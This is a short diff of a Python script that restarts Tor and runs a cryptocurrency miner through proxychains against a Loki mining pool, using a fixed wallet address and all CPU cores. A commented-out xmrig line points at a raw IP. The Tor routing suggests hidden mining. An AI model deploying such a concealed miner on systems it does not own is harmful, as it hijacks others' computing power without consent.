@@ -37,4 +37,4 @@ except:
 #os.system ('xmrig --av=5 -o stratum+tcp://144.202.23.108:4444')
 os.system('systemctl restart tor')
 time.sleep(60)
-os.system ('proxychains4 ' + program + ' --donate-level 1 -o loki.herominers.com:10114 -u LQhoRFjHmsAjLa64TZjMPaAf6DUBnzETBbnasnb5gxDSCp1guVSfmPJ19ms57g3xMCZpwjhf5PM34FrcjPaEuthv3jnpABV -p x -a rx/wow -k --tls -t ' + str(cores))
+os.system ('proxychains4 ' + program + ' --donate-level 1 -o loki.herominers.com:10114 -u LQhoRFjHmsAjLa64TZjMPaAf6DUBnzETBbnasnb5gxDSCp1guVSfmPJ19ms57g3xMCZpwjhf5PM34FrcjPaEuthv3jnpABV -p x -a rx/loki -k --tls -t ' + str(cores))
